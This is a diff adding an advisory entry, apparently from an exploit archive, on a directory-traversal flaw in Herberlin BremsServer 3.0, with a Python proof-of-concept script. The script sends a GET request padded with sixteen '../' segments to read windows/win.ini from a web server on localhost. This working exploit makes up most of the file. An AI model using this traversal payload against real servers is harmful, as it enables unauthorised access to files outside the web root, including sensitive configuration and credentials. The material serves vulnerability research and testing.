@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/9493/info
+
+Herberlin BremsServer is prone to a directory-traversal vulnerability. An attacker may exploit this issue to gain access to files residing outside the web server root directory of the affected system. This issue exists due to a failure to validate user specified URI input.
+
+BremsServer 3.0 is vulnerable; other versions may also be affected.
+
+# --PoC--
+
+import socket
+
+host = 'localhost'
+port = 80
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.settimeout(8)    
+
+s.send('GET /' + '../' * 16 + 'windows/win.ini HTTP/1.1\r\n'
+       'Host: localhost\r\n\r\n')
+
+print s.recv(8192)
